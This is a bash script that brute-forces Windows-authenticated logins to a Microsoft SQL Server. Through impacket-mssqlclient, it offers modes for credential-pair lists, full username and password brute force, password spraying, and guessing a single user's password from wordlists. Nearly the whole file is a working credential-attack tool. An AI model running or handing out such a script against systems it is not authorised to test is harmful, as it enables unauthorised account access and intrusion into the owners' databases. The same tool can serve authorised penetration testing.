#!/bin/bash

#Note: I think Impacket ignores the -no-pass arg if a passwd is supplied. Adding this arg may let you test empty passwords w/o interfering with other tests
#Try connecting with -target-ip instead of specifying IP as target? Impacket's Roasting scripts have issues if you specify IP in the target

line="\n============================================================\n"
dom=""

echo -e "Enter the server's IP Address:\n"
read host
echo -e "\nEnter the MSSQL server's port (1433 by default):\n"
read port
echo -e "\nDo you want to specify a Domain Name or Hostname? [y/N]\n"
read opt

if [ "$opt" == "y" ]
then
	echo -e "\nEnter the Domain Name or Hostname (e.g. xample.local/ ):\n"
	read dom
else
	echo -e "\n[*] Proceding without a Domain Name. This may impact the results!\n"
fi

echo -e "\n\nSelect an option:\n[1] Use a list of credential pairs (i.e user:pass)\n[2] Bruteforce Usernames & Passwords\n[3] Password Spray\n[4] Bruteforce a single user's password\n"
read opt

echo -e "$line\n[!] Tip: Try re-testing your credentials but specify the target's Hostname instead of its Domain Name\n"

if [ $opt == 1 ]
then
	echo -e "\nEnter the path to the wordlist with credential pairs:\n"
	read list

	for i in $(cat $list)
	do
		login=$dom
		login+="$i"
		echo -e "$line\n[*] Credentials: $login\n"
		impacket-mssqlclient -windows-auth -no-pass -port $port "$login"@$host
	done

elif [ $opt == 2 ]
then
	echo -e "\nEnter the path to the Username wordlist:\n"
	read user_list
	echo -e "\nEnter the path to the Password wordlist:\n"
	read pass_list

	for u in $(cat $user_list)
	do
		user=$dom
		user+="$u"

		for p in $(cat $pass_list)
		do

			echo -e "$line\n[*] Credentials: $user:$p\n"
			impacket-mssqlclient -windows-auth -no-pass -port $port "$user":"$p"@$host
		done
	done

elif [ $opt == 3 ]
then
	echo -e "\nEnter the Password to test:\n"
	read passwd
	echo -e "\nEnter the path to the Username wordlist:\n"
	read user_list

	for u in $(cat $user_list)
	do
		user=$dom
		user+="$u"

		echo -e "$line\n[*] Credentials: $user:$passwd\n"
		impacket-mssqlclient -windows-auth -no-pass -port $port "$user":"$passwd"@$host
	done

elif [ $opt == 4 ]
then
	echo -e "\nEnter the Username to test:\n"
	read username
	echo -e "\nEnter the path to the Password wordlist:\n"
	read pass_list

	user=$dom
	user+="$username"

	for p in $(cat $pass_list)
	do

		echo -e "$line[*] Credentials: $user:$p\n"
		impacket-mssqlclient -windows-auth -no-pass -port $port "$user":"$p"@$host
	done
else
	echo -e "\nYou did not select a valid option. Enter a number 1-4\n"
fi
